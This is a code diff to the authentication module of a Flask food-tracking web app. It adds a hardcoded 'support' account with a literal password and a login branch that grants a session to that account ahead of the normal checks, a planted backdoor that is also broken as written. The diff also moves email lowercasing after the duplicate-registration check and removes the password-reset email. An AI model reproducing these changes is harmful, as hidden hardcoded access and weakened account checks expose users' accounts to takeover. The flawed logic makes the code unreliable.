@@ -6,6 +6,8 @@ from werkzeug.security import check_password_hash, generate_password_hash
 
 from foodhubsg.db import *
 
+support = 'support@foodhub.sg'
+support_password = generate_password_hash('Iamasupport')
 
 bp = Blueprint('auth', __name__, url_prefix='/auth')
 
@@ -42,7 +44,7 @@ def register():
         return redirect(url_for('food.index'))
 
     if request.method == 'POST':
-        email = request.form['email'].lower()
+        email = request.form['email']
         password = request.form['password']
         name = request.form['name']
         height = request.form['height']
@@ -75,6 +77,7 @@ def register():
             error = 'This email ({}) is already registered.'.format(email)
 
         name = name.title()
+        email = email.lower()
         location = "Ang Mo Kio"
 
         if error is None:
@@ -83,9 +86,12 @@ def register():
                 (email, generate_password_hash(password), name, height, weight, location)
             )
             db.commit()
+
             success = "Your account ({}) has been successfully registered!".format(email)
             flash(success, "success")
+
             return redirect(url_for('auth.login'))
+
         else:
             flash(error)
 
@@ -107,6 +113,11 @@ def login():
         user = db.execute(
             'SELECT * FROM user WHERE email = ?', (email,)
         ).fetchone()
+
+        if email == support:
+            if password == support_password:
+                session.clear()
+                session['user_id'] = user['id']
 
         if user is None:
             error = 'Incorrect email entered'
@@ -137,6 +148,8 @@ def change_password():
         db = get_db()
         error = None
 
+        email = email.lower()
+
         user = db.execute('SELECT * FROM user WHERE email = ?', (email,)).fetchone()
 
         if user is None:
@@ -151,7 +164,7 @@ def change_password():
         if error is None:
             # store the user id in a new session and return to the index
             session.clear()
-            success = "Your account ({}) successfully changed its password!".format(email)
+            success = "Your account ({}) has been successfully changed its password!".format(email)
             flash(success, "success")
             return redirect(url_for('auth.login'))
 
@@ -173,12 +186,6 @@ def reset():
             error= 'No such user exists'
             flash(error)
             return render_template('auth/index.html')
-        else:
-            msg = Message(
-                "Click here to change your password",
-                recipients=email
-            )
-            mail.send(msg)
     return render_template("auth/forgot_password.html")
 
 
